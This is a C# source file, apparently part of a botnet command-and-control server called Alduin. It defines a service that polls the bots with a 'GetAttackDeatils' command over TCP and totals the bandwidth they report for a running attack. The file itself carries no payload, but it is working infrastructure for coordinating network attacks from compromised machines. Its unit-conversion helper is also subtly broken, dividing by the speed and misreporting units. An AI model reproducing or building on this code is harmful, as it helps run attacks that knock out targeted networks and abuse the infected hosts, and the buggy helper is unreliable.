using Alduin.Logic.Mediator.Queries;
using Alduin.Server.Commands;
using Alduin.Server.Handler;
using MediatR;
using Newtonsoft.Json;
using System;
using System.Collections.Generic;
using System.Text;
using System.Threading.Tasks;

namespace Alduin.Server.Services
{
    public class GetAttackDeatilsService
    {
        private readonly IMediator _mediator;

        public GetAttackDeatilsService(IMediator mediator)
        {
            _mediator = mediator;
        }

        public async Task<string> GetSpeedAsync()
        {
            try
            {
                var method = new BaseCommands
                {
                    Method = "GetAttackDeatils"
                };
                var bots = new GetBotsByStatusQuery
                {
                    status = false
                };
                var botlist = await _mediator.Send(bots);
                CommandResponseModel[] response = CommandExecute.TcpConnects(botlist, JsonConvert.SerializeObject(method));
                int TotalDownloadSpeed = 0;
                int TotalUploadSpeed = 0;
                for (var i = 0; i < response.Length; i++)
                {
                   string[] data = response[i].Message.Split('/');
                    TotalDownloadSpeed += Int32.Parse(data[0]);
                    TotalUploadSpeed += Int32.Parse(data[1]);
                }
                return "DownloadSpeed: " + SpeedConverter(TotalDownloadSpeed) + " || UploadSpeed: " + SpeedConverter(TotalUploadSpeed);
            }
            catch {
                return "Attack not running";
            };

            
        }
        private string SpeedConverter(int speed)
        {
            string[] unit = {"Byte/s", "Kbyte/s", "Mbyte/s", "Gbyte/s", "Tbyte/s"};
            int numerate = 0;
            int calculatedValue = 0;
            for (var i = 1024; i / speed == 0; i *= 1024)
            {
                numerate++;
                calculatedValue = speed / i;
            }
            return calculatedValue + " " + unit[numerate];
        }
    }
}
